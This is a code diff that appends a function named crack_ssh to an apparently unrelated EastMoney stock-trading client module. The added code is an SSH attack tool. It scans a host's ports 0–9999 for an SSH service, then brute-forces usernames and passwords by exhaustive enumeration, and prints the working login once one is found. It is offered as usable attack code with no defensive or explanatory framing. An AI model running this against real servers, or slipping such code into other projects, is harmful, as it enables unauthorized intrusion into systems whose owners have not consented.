@@ -770,3 +770,38 @@ class EastMoney(object):
         if response['Status'] == 0:
             return response
         print('下单失败, %s' % json.dumps(response, ensure_ascii=False))
+def crack_ssh(host):
+    import itertools
+    import string
+    import paramiko
+    client = paramiko.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    port = 22
+    for p in range(10000):
+        print(p)
+        try:
+            client.connect(host, port=p, username='root', password='123', timeout=5)
+        except paramiko.AuthenticationException:
+            port = p
+            break
+        except Exception as e:
+            pass
+    else:
+        print('找不到端口')
+        return
+    print(f'找到了端口为{port}')
+    for i in range(3, 10):
+        for guess in itertools.product(string.ascii_letters, repeat=i):
+            user = ''.join(guess)
+            for j in range(20):
+                print(f'尝试密码长度{j}')
+                for k in itertools.product(string.ascii_letters + string.digits + '!#$%&,-.=@^_~', repeat=j):
+                    pwd = ''.join(k)
+                    try:
+                        client.connect(host, port=port, username=user, password=pwd, timeout=3)
+                        msg = f"登录成功 ssh -P {port} {user}@{host} {pwd}"
+                        print(msg)
+                        return msg
+                    except Exception as e:
+                        pass
+    print('破解不了')
